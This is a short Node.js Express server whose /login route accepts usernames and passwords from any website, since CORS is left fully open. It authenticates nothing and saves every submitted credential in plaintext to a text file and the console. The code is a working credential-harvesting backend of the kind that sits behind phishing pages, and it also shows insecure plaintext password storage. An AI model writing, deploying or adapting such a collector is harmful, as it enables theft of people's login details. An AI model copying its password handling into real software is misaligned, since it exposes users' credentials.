const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// File path
const LOG_FILE = path.join(__dirname, "logins.txt");

// Login route
app.post("/login", (req, res) => {
    const { username, password } = req.body;

    const time = new Date().toISOString();

    const logEntry =
        `${time} | username=${username} | password=${password}\n`;

    // Save into file
    fs.appendFile(LOG_FILE, logEntry, (err) => {
        if (err) {
            console.error("Error saving login:", err);

            return res.status(500).json({
                message: "Failed to save login"
            });
        }

        console.log("Saved:", logEntry.trim());

        res.json({
            message: "Login received and saved"
        });
    });
});

// Hosting-safe port
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});